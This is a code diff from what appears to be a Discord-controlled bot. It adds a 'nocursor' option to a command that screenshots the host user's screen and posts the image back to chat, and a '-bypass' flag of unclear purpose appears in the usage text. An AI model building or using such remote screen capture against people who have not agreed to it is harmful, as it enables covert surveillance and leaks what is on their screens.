@@ -7,18 +7,29 @@ namespace Main.Source.Bot.Commands
     {
         public override string Name => "ss";
         public override string Info => "Takes a screenshot of the users screen";
-        public override string Use => "Scale factor (num)? [-bypass? | -nocursor?]";
+        public override string Use => "Scale factor (num)? | [-bypass?, -nocursor?]";
 
         public override async Task Func(SocketCommandContext socket, string[] args)
         {
             float? scale = null;
+            bool cursor = true;
 
-            if (args.Length > 0 && float.TryParse(args[0], out float parsed))
+            string arguments = string.Join(" ", args);
+
+            if (args.Length > 0)
             {
-                scale = parsed;
+                if (float.TryParse(args[0], out float parsed))
+                {
+                    scale = parsed;
+                }
+                
+                if (Utilities.Parser.GetFlag(arguments, "nocursor"))
+                {
+                    cursor = false;
+                }
             }
 
-            if (await Functions.Screenshot.TakeScreenshot(scale) is not MemoryStream screenshot)
+            if (await Functions.Screenshot.TakeScreenshot(scale, cursor) is not MemoryStream screenshot)
             {
                 await socket.Message.ReplyAsync("Failed to take screenshot");
                 return;
